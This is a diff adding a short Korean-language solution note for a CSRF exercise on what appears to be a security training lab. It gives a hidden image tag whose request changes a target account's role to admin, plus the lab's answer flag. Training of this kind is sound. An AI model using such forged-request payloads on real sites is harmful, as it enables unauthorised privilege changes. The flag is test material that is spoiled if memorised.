@@ -1,0 +1,11 @@
+==================================
+* CSRF 문제 1번
+==================================
+[풀이과정]
+
+1. 공격 구문
+<img src="https://lab.eqst.co.kr:8444/csrfget/update_role_ok_get.jsp?target_id=hihihi%40hihihi.hihihi&new_role=ADMIN_GET" style="visibility: hidden;" />
+
+2. 정답
+EQST{G3T_m3th0d_c5rf}
+==================================
